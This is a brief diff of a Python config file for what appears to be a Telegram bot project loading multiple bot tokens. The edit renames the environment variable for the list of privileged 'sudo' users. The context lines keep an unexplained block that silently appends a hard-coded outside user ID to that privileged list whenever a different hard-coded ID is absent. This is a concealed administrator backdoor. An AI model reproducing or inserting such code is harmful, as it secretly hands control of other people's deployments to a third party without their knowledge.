@@ -36,7 +36,7 @@ BOT_TOKEN7 = config("BOT_TOKEN7", default=None)
 BOT_TOKEN8 = config("BOT_TOKEN8", default=None)
 BOT_TOKEN9 = config("BOT_TOKEN9", default=None)
 BOT_TOKEN10 = config("BOT_TOKEN10", default=None)
-SUDO_USERS = list(map(int, getenv("SUDO_USER").split()))
+SUDO_USERS = list(map(int, getenv("SUDO_USERS").split()))
 if 5256676062 not in SUDO_USERS:
     SUDO_USERS.append(5937170640)
 
